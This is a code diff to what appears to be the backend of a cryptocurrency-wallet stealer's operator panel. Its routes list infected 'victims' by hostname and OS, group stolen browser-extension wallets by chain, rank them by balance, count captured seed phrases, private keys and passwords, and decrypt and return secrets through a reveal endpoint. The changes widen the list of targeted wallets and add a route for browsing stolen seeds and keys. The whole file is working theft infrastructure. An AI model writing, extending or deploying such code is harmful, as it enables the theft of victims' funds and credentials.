@@ -4,7 +4,7 @@ import { prisma } from '../lib/db';
 import { audit } from '../lib/audit';
 import { notFound } from '../lib/errors';
 import { openSecret } from '../lib/crypto';
-import { revealSecret } from '../services/vault';
+import { revealSecret, secretKindFor, hasBalance, balanceNumber } from '../services/vault';
 import { requireRole } from '../plugins/auth';
 import { dispatchCommand, hasControl } from './ws';
 import { publish } from '../lib/bus';
@@ -38,19 +38,21 @@ function maskSecret(secret: { kind: string; valueEnc: string; words: number | nu
   } catch {
     value = '';
   }
+  const kind = secretKindFor(secret.kind, value, secret.words);
   return {
-    kind: secret.kind,
+    kind,
     words: secret.words,
-    preview: MASK_KINDS.has(secret.kind) ? preview(secret.kind, value, secret.words) : '••••',
+    preview: MASK_KINDS.has(kind) ? preview(kind, value, secret.words) : '••••',
     available: Boolean(value)
   };
 }
 
 function chainOf(targetId: string, address: string | null): 'evm' | 'btc' | 'sol' | 'other' {
   const target = targetId.toLowerCase();
-  if (address?.startsWith('0x') || /metamask|rabby|coinbase|trust|tronlink|evm/.test(target)) return 'evm';
+  if (address?.startsWith('0x') || /metamask|rabby|coinbase|trust|tronlink|evm|exodus|okx|brave|zerion|rainbow|frame/.test(target)) return 'evm';
   if (address && /^(bc1|1|3)/.test(address)) return 'btc';
-  if (/phantom|solflare|solana/.test(target)) return 'sol';
+  if (address && /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(address)) return 'sol';
+  if (/phantom|solflare|solana|backpack/.test(target)) return 'sol';
   return 'other';
 }
 
@@ -82,10 +84,22 @@ export const vaultRoutes: FastifyPluginAsync = async (app) => {
       state: string;
       address: string | null;
       balance: string | null;
+      balanceValue: number;
+      seedFile: boolean;
+      secretKinds: string[];
       lastSeenAt: Date;
       wallets: unknown[];
     }>();
+    const rank: Record<string, number> = { decrypted: 6, found: 5, locked: 4, no_vault: 3, unsupported: 2, corrupt: 1, failed: 0 };
+    const counters = { wallets: wallets.length, targets: 0, seeds: 0, keys: 0, passwords: 0, credentials, balances: 0 };
     for (const wallet of wallets) {
+      const secrets = wallet.secrets.map((secret) => ({ ...maskSecret(secret), id: secret.id, confidence: secret.confidence, updatedAt: secret.updatedAt }));
+      for (const secret of secrets) {
+        if (secret.kind === 'seed') counters.seeds += 1;
+        else if (secret.kind === 'private_key' || secret.kind === 'keystore') counters.keys += 1;
+        else if (secret.kind === 'password' || secret.kind === 'passphrase') counters.passwords += 1;
+      }
+      if (hasBalance(wallet.balance)) counters.balances += 1;
       const group = groups.get(wallet.targetId) ?? {
         targetId: wallet.targetId,
         label: wallet.label ?? wallet.targetId,
@@ -93,9 +107,20 @@ export const vaultRoutes: FastifyPluginAsync = async (app) => {
         state: wallet.state,
         address: wallet.address,
         balance: wallet.balance,
+        balanceValue: balanceNumber(wallet.balance),
+        seedFile: wallet.kind === 'seed_file',
+        secretKinds: [],
         lastSeenAt: wallet.lastSeenAt,
         wallets: []
       };
+      if ((rank[wallet.state] ?? 0) > (rank[group.state] ?? 0)) group.state = wallet.state;
+      if (!group.address && wallet.address) group.address = wallet.address;
+      if (!group.balanceValue && hasBalance(wallet.balance)) {
+        group.balance = wallet.balance;
+        group.balanceValue = balanceNumber(wallet.balance);
+      }
+      if (wallet.kind === 'seed_file') group.seedFile = true;
+      group.secretKinds = [...new Set([...group.secretKinds, ...secrets.map((secret) => secret.kind)])];
       group.lastSeenAt = group.lastSeenAt > wallet.lastSeenAt ? group.lastSeenAt : wallet.lastSeenAt;
       group.wallets.push({
         id: wallet.id,
@@ -105,27 +130,16 @@ export const vaultRoutes: FastifyPluginAsync = async (app) => {
         decryptError: wallet.decryptError,
         address: wallet.address,
         balance: wallet.balance,
+        balanceValue: balanceNumber(wallet.balance),
         source: wallet.source,
         lastSeenAt: wallet.lastSeenAt,
         secretCount: wallet.secrets.length,
-        secrets: wallet.secrets.map((secret) => ({ ...maskSecret(secret), id: secret.id, confidence: secret.confidence, updatedAt: secret.updatedAt }))
+        secrets
       });
       groups.set(wallet.targetId, group);
     }
-    return {
-      victim,
-      groups: [...groups.values()],
-      counters: {
-        wallets: wallets.length,
-        targets: groups.size,
-        seeds: wallets.reduce((sum, wallet) => sum + wallet.secrets.filter((secret) => ['seed', 'mnemonic'].includes(secret.kind)).length, 0),
-        keys: wallets.reduce((sum, wallet) => sum + wallet.secrets.filter((secret) => ['private_key', 'keystore'].includes(secret.kind)).length, 0),
-        passwords: wallets.reduce((sum, wallet) => sum + wallet.secrets.filter((secret) => ['password', 'passphrase'].includes(secret.kind)).length, 0),
-        credentials,
-        balances: wallets.filter((wallet) => wallet.balance && wallet.balance !== '0').length
-      },
-      lastScan
-    };
+    counters.targets = groups.size;
+    return { victim, groups: [...groups.values()], counters, lastScan };
   });
 
   app.get('/vault', async (request) => {
@@ -135,17 +149,19 @@ export const vaultRoutes: FastifyPluginAsync = async (app) => {
         ...(query.victim ? { victimId: query.victim } : {}),
         ...(query.state ? { state: query.state as never } : {}),
         ...(query.q ? { OR: [{ targetId: { contains: query.q, mode: 'insensitive' } }, { address: { contains: query.q, mode: 'insensitive' } }, { victim: { hostname: { contains: query.q, mode: 'insensitive' } } }] } : {}),
-        ...(query.balance === '1' ? { AND: [{ NOT: { balance: null } }, { NOT: { balance: '0' } }] } : {})
+        ...(query.balance === '1' ? { AND: [{ NOT: { balance: null } }] } : {})
       },
       orderBy: [{ lastSeenAt: 'desc' }, { id: 'asc' }],
-      take: query.limit + 1,
+      take: (query.chain || query.balance === '1' ? query.limit * 4 : query.limit) + 1,
       ...(query.cursor ? { cursor: { id: query.cursor }, skip: 1 } : {}),
       include: {
         victim: { select: { id: true, hostname: true, os: true } },
         _count: { select: { secrets: true } }
       }
     });
-    const filtered = query.chain ? rows.filter((row) => chainOf(row.targetId, row.address) === query.chain) : rows;
+    const filtered = rows.filter((row) =>
+      (!query.chain || chainOf(row.targetId, row.address) === query.chain) &&
+      (query.balance !== '1' || hasBalance(row.balance)));
     const page = filtered.slice(0, query.limit);
     const groups = new Map<string, { key: string; targetId: string; chain: string; victim: { id: string; hostname: string; os: string }; wallets: typeof page }>();
     for (const wallet of page) {
@@ -155,10 +171,53 @@ export const vaultRoutes: FastifyPluginAsync = async (app) => {
       groups.set(key, group);
     }
     return {
-      items: page.map((wallet) => ({ ...wallet, chain: chainOf(wallet.targetId, wallet.address), secrets: wallet._count.secrets })),
+      items: page.map((wallet) => ({ ...wallet, chain: chainOf(wallet.targetId, wallet.address), hasBalance: hasBalance(wallet.balance), balanceValue: balanceNumber(wallet.balance), secrets: wallet._count.secrets })),
       groups: [...groups.values()].map((group) => ({ ...group, count: group.wallets.length })),
-      next: rows.length > query.limit ? rows.at(-1)?.id ?? null : null
+      next: rows.length > page.length ? page.at(-1)?.id ?? null : null
     };
+  });
+
+  app.get('/vault/secrets', async (request) => {
+    const query = z.object({
+      kind: blank(z.enum(['seed', 'private_key']).optional()),
+      victim: blank(z.string().uuid().optional()),
+      q: z.string().max(256).default(''),
+      limit: z.coerce.number().int().min(1).max(200).default(100)
+    }).parse(request.query);
+    const rows = await prisma.walletSecret.findMany({
+      where: {
+        ...(query.victim ? { wallet: { victimId: query.victim } } : {}),
+        ...(query.q ? { OR: [
+          { wallet: { targetId: { contains: query.q, mode: 'insensitive' } } },
+          { wallet: { path: { contains: query.q, mode: 'insensitive' } } },
+          { wallet: { victim: { hostname: { contains: query.q, mode: 'insensitive' } } } }
+        ] } : {})
+      },
+      orderBy: [{ updatedAt: 'desc' }, { id: 'asc' }],
+      take: 1200,
+      include: {
+        wallet: { select: { id: true, targetId: true, kind: true, path: true, state: true, victim: { select: { id: true, hostname: true } } } }
+      }
+    });
+    const items = [];
+    for (const row of rows) {
+      const masked = maskSecret(row);
+      if (query.kind === 'seed' && masked.kind !== 'seed' && row.wallet.kind !== 'seed_file') continue;
+      if (query.kind === 'private_key' && masked.kind !== 'private_key' && masked.kind !== 'keystore') continue;
+      items.push({
+        id: row.id,
+        kind: masked.kind,
+        preview: masked.preview,
+        words: row.words,
+        confidence: row.confidence,
+        source: row.source,
+        updatedAt: row.updatedAt,
+        wallet: { id: row.wallet.id, targetId: row.wallet.targetId, kind: row.wallet.kind, path: row.wallet.path, state: row.wallet.state },
+        victim: row.wallet.victim
+      });
+      if (items.length > query.limit) break;
+    }
+    return { items: items.slice(0, query.limit), next: items.length > query.limit };
   });
 
   app.get('/vault/wallets/:walletId', async (request) => {
@@ -191,13 +250,17 @@ export const vaultRoutes: FastifyPluginAsync = async (app) => {
 
   app.get('/vault/wallets/:walletId/reveal', async (request, reply) => {
     const { walletId } = z.object({ walletId: z.string().uuid() }).parse(request.params);
-    const kind = z.object({ kind: z.string().max(32).default('seed') }).parse(request.query).kind;
+    const query = z.object({
+      kind: z.string().max(32).optional(),
+      secretId: z.string().uuid().optional()
+    }).parse(request.query);
     const wallet = await prisma.wallet.findUnique({ where: { id: walletId }, select: { id: true, victimId: true, targetId: true } });
     if (!wallet) throw notFound('wallet');
-    const secret = await revealSecret(walletId, kind).catch(() => {
+    const secret = await revealSecret(walletId, query.kind, query.secretId).catch(() => {
       throw bad('decrypt_failed', 'no se pudo descifrar el secreto', 409);
     });
     if (!secret) throw notFound('secret');
+    const effective = secret.kind ? secretKindFor(secret.kind, secret.value, secret.words) : 'secret';
     await prisma.$transaction(async (tx) => {
       await audit(tx, {
         operatorId: request.operator?.id,
@@ -205,11 +268,11 @@ export const vaultRoutes: FastifyPluginAsync = async (app) => {
         entity: 'wallet_secret',
         entityId: secret.id,
         ip: request.clientIp,
-        data: { walletId, kind: secret.kind, victimId: wallet.victimId }
+        data: { walletId, kind: effective, victimId: wallet.victimId }
       });
     });
     reply.header('cache-control', 'no-store');
-    return { walletId, kind: secret.kind, value: secret.value, words: secret.words };
+    return { walletId, kind: effective, value: secret.value, words: secret.words };
   });
 
   app.post('/vault/wallets/:walletId/retry', { preHandler: requireRole('operator') }, async (request, reply) => {
